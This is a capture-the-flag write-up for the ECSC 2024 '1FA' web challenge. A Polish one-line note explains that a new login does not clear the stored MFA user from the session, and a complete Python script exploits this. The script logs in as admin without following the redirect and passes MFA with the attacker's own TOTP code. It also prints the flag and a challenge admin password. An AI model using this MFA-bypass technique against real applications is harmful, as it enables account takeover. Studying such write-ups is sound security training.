# 1FA - web - misc

### Vulnerability

Nowe logowanie nie kasuje poprzedniego user'a z `session["mfa_user"]`

### Solution

Steps:
    1. set mfa_login to our user
    2. set mfa_user to our user (GET /mfa)
    3. login as admin (dont follow redirect)
    4. login with our mfa

```python
import requests
import random
import cairosvg
import pyotp
import re
import io

from PIL import Image
import zxing

# steps:
# 1. set mfa_login to our user
# 2. set mfa_user to our user (GET /mfa)
# 3. login as admin (dont follow redirect)
# 4. login with our mfa

HOST = "https://1fa.ecsc24.hack.cert.pl"

USERNAME = str(random.random()) # "A" * 8
PASSWORD = "A" * 8

r = requests.Session()

r.post(f"{HOST}/register", data={
    "login": USERNAME,
    "password": PASSWORD,
    "password_rep": PASSWORD,
})

r.post(f"{HOST}/login", data={
    "login": USERNAME,
    "password": PASSWORD,
})

res = r.get(f"{HOST}/mfa-setup").text
code_svg = re.findall(r"<svg.*</svg>", res)[-1]

reader = zxing.BarCodeReader()
content = reader.decode(Image.open(io.BytesIO(cairosvg.svg2png(bytestring=code_svg))))

otp = pyotp.parse_uri(content.raw)
r.post(f"{HOST}/mfa-setup", data={
    "mfa_code": otp.now()
})

r.get(f"{HOST}/logout")

r.post(f"{HOST}/login", data={
    "login": USERNAME,
    "password": PASSWORD,
}) # redirects to /mfa

r.post(f"{HOST}/login", data={
    "login": "admin",
    "password": "RobertR@c!ng#24",
}, allow_redirects=False) # do not redirect to /mfa

res = r.post(f"{HOST}/mfa", data={
    "mfa_code": otp.now() # our mfa code
})

print(re.findall(r"ecsc24{.*}", res.text)[0]) # ecsc24{y0u'v3_w0n_7h3_r4c3}
```